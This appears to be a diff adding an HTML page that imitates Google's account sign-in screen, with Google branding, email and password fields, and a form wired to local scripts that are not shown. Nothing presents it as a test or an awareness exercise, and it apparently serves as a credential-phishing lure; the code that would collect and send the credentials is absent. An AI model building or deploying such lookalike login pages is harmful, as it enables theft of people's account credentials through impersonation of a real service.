@@ -1,0 +1,71 @@
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - Google Accounts</title>
+    <link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
+    <link rel="stylesheet" href="style.css">
+
+    <!-- Source for fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Noto+Sans&family=Ubuntu:wght@700&display=swap" rel="stylesheet">    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Noto+Sans:wght@300&display=swap" rel="stylesheet">
+    <!-- Include the new frontend.js file -->
+    <script src="frontend.js"></script>
+</head>
+
+<body>
+    <div id="container">
+        <div id="square">
+            <div id="logo_container">
+                <img src="google.png" id="logo">  
+                <!-- width="87" height="33"> -->
+            </div>
+            <div id="top_text">Sign in</div>
+            <div id="top_subtext">Use your Google Account</div>
+
+            <!-- Add the loginForm ID to the form element -->
+            <form id="loginForm">
+                <div id="input_container">
+                    <input type="text" name="" id="input">
+                    <div id="placeholder">Email or phone</div>
+                </div>
+                <div id="input_container2">
+                    <input type="password" name="" id="input2">
+                    <div id="placeholder2">Password</div>
+                </div>
+
+                <div id="link1" class="link">Forgot password?</div>
+                <div id="not">Not your computer? Use Guest mode to sign in privately.</div>
+                <div id="link2" class="link"><a href="#" target="_blank" style="text-decoration: none;color: #1a73e8;">Learn more</a></div>
+                <div id="last_split">
+                    <div class="btn_container">
+                        <a href="https://accounts.google.com/lifecycle/steps/signup/name?continue=https://www.google.com/search?q%3Dgoogle%26oq%3Dgoogle%26gs_lcrp%3DEgZjaHJvbWUyBggAEEUYOTIGCAEQRRg7MgYIAhBFGDsyBggDEEUYOzIGCAQQRRhBMgYIBRBFGDwyBggGEEUYPDIGCAcQRRhB0gEJMTEzNDJqMGoxqAIAsAIA%26sourceid%3Dchrome%26ie%3DUTF-8&dsh=S-1912515727:1703518145207956&ec=GAZAAQ&flowEntry=SignUp&flowName=GlifWebSignIn&hl=en&ifkv=ASKXGp1ty_U5Vhb4mvKm9mqI0QiYnME13pQVzx7G-5ssuoYLRzrJsNGsao34uRg9-FQEy-zpDM0w&theme=glif&TL=AHNYTIRMQz6n7VXe39M7WGmSI-vdwaZwFyNBZhlxCHpnvXAU7p_ka1YcRBkqjj4l" id="btn_left" style="text-decoration: none;">Create account</a>
+                    </div>
+                    <div id="btn2" class="btn_container">
+                        <input type="submit" value="Next" id="btn_right">
+                    </div>
+                </div>
+            </form>
+
+
+        <div id="bottom_text">
+            <div id="lang_container">
+                <select name="lang" id="lang">
+                    <option value="English(United States)">English (United States)</option>
+                    <option value="English(United States)">English (United Kingdom)</option>
+                </select>
+            </div>
+            <div>Help</div>
+            <div>Privacy</div>
+            <div>Terms</div>
+        </div>
+    </div>
+    
+    <script src="script.js"></script>
+    
+</body>
+</html>
